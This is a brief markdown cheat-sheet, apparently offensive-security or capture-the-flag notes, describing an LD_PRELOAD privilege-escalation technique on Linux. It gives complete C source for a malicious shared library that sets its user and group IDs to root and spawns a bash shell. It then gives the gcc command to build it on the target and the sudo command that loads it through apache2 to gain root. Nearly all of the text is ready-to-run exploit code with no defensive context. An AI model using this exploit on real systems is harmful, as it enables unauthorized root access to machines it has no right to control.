### LD_PRELOAD
```
ldd /bin/ls
```

### Shared Library compile exploit
Step 1: Create .so file from .c
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Step 2: Compile .so file on target if possible
```
gcc -fPIC -shared -o root.so root.c -nostartfiles
```
STep 3: Execute LD_PRELOAD exploit
```
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```
